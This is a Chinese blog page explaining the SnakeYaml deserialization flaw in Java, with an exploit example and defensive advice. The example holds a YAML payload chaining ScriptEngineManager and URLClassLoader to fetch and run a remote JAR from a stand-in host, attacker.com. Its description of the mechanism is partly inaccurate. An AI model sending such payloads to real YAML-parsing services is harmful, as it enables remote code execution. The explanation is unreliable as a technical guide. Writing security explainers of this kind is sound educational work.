<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SnakeYaml反序列化漏洞利用分析（Java） - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SnakeYaml反序列化漏洞利用分析（Java）" />
<meta property="og:description" content="SnakeYaml是一个流行的Java库，用于将YAML（YAML Ain’t Markup Language）数据转换为Java对象。然而，SnakeYaml在反序列化处理上存在安全漏洞，可能导致远程代码执行。本文将探讨SnakeYaml反序列化漏洞的原理，并提供相应的Java代码示例。
漏洞原理
SnakeYaml的反序列化漏洞是由于其对自定义类型的处理不当而引起的。攻击者可以构造恶意的YAML数据，其中包含特定的类型和命令，以触发远程代码执行。漏洞的根本原因是SnakeYaml在反序列化时会调用Java对象的默认构造函数，并在之后调用setter方法来设置对象的属性值。如果自定义类型的setter方法中存在恶意代码，那么在反序列化时，该恶意代码将被执行。
漏洞利用示例
下面是一个利用SnakeYaml反序列化漏洞的示例代码：
import org.yaml.snakeyaml.Yaml; public class SnakeYamlExploit { public static void main(String[] args) { String yamlData = &#34;!!javax.script.ScriptEngineManager [\n&#34; &#43; &#34; !!java.net.URLClassLoader [[\n&#34; &#43; &#34; !!java.net.URL [\&#34;http://attacker.com/evil.jar\&#34;]\n&#34; &#43; &#34; ]]\n&#34; &#43; &#34;]&#34;; Yaml yaml = new Yaml(); Object obj = yaml.load(yamlData); } } 在上述代码中，我们构造了一个包含javax.script.ScriptEngineManager类型的YAML数据。在反序列化时，SnakeYaml会尝试创建一个ScriptEngineManager对象，并调用其默认构造函数。然后，它会调用对象的setter方法，传入一个包含恶意代码的URLClassLoader对象。该恶意代码将尝试从http://attacker.com/evil.jar下载并执行恶意的Java代码。
防御措施
为了防止SnakeYaml反序列化漏洞的利用，可以采取以下措施： 3.1 更新到最新版本：SnakeYaml的开发团队通常会修复安全漏洞并发布新的版本。确保使用最新版本的SnakeYaml库可以减少受到已知漏洞的风险。
3.2 限制可信数据源：只允许从受信任的数据源加载YAML数据。可以通过配置Java安全策略或使用沙箱环境来限制从外部加载的类和代码。
3.3 序列化过滤：实施合适的反序列化过滤机制，只允许反序列化应用程序内部定义的类，并禁止反序列化不受信任的类。
总结
SnakeYaml是一个流行的Java库，用于YAML数据的解析和反序列化。然而，它存在反序列化漏洞，可能导致远程代码执行。为了减少受到此类漏洞的风险，开发人员应注意更新SnakeYaml到最新版本，并采取适当的安全措施，如限制可信数据源和实施序列化过滤机制来保护应用程序的安全性。 以上是关于SnakeYaml反序列化漏洞利用的分析，并提供了相应的Java代码示例。希望本文对您有所帮助！" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/c3587a6109c66bec821bcd823fd0b187/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-19T05:10:10+08:00" />
<meta property="article:modified_time" content="2023-09-19T05:10:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SnakeYaml反序列化漏洞利用分析（Java）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>SnakeYaml是一个流行的Java库，用于将YAML（YAML Ain’t Markup Language）数据转换为Java对象。然而，SnakeYaml在反序列化处理上存在安全漏洞，可能导致远程代码执行。本文将探讨SnakeYaml反序列化漏洞的原理，并提供相应的Java代码示例。</p> 
<ol><li> <p>漏洞原理<br> SnakeYaml的反序列化漏洞是由于其对自定义类型的处理不当而引起的。攻击者可以构造恶意的YAML数据，其中包含特定的类型和命令，以触发远程代码执行。漏洞的根本原因是SnakeYaml在反序列化时会调用Java对象的默认构造函数，并在之后调用setter方法来设置对象的属性值。如果自定义类型的setter方法中存在恶意代码，那么在反序列化时，该恶意代码将被执行。</p> </li><li> <p>漏洞利用示例<br> 下面是一个利用SnakeYaml反序列化漏洞的示例代码：</p> </li></ol> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span></span><span class="token class-name">Yaml</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYamlExploit</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> yamlData <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
                <span class="token string">"    !!java.net.URL [\"http://attacker.com/evil.jar\"]\n"</span> <span class="token operator">+</span>
                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
                <span class="token string">"]"</span><span class="token punctuation">;</span>

        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> obj <span class="token operator">=</span> yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>yamlData<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>在上述代码中，我们构造了一个包含<code>javax.script.ScriptEngineManager</code>类型的YAML数据。在反序列化时，SnakeYaml会尝试创建一个<code>ScriptEngineManager</code>对象，并调用其默认构造函数。然后，它会调用对象的setter方法，传入一个包含恶意代码的<code>URLClassLoader</code>对象。该恶意代码将尝试从<code>http://attacker.com/evil.jar</code>下载并执行恶意的Java代码。</p> 
<ol start="3"><li>防御措施<br> 为了防止SnakeYaml反序列化漏洞的利用，可以采取以下措施：</li></ol> 
<p>3.1 更新到最新版本：SnakeYaml的开发团队通常会修复安全漏洞并发布新的版本。确保使用最新版本的SnakeYaml库可以减少受到已知漏洞的风险。</p> 
<p>3.2 限制可信数据源：只允许从受信任的数据源加载YAML数据。可以通过配置Java安全策略或使用沙箱环境来限制从外部加载的类和代码。</p> 
<p>3.3 序列化过滤：实施合适的反序列化过滤机制，只允许反序列化应用程序内部定义的类，并禁止反序列化不受信任的类。</p> 
<ol start="4"><li>总结<br> SnakeYaml是一个流行的Java库，用于YAML数据的解析和反序列化。然而，它存在反序列化漏洞，可能导致远程代码执行。为了减少受到此类漏洞的风险，开发人员应注意更新SnakeYaml到最新版本，并采取适当的安全措施，如限制可信数据源和实施序列化过滤机制来保护应用程序的安全性。</li></ol> 
<p>以上是关于SnakeYaml反序列化漏洞利用的分析，并提供了相应的Java代码示例。希望本文对您有所帮助！</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0ff48878fe43d04d3eeeb5fdf66ebfc3/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">浅谈抛出异常和捕获异常的一些区别</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/46298f39da79d48fc6045c1d17145d89/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">markdown所有格式语法及其用法注意</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>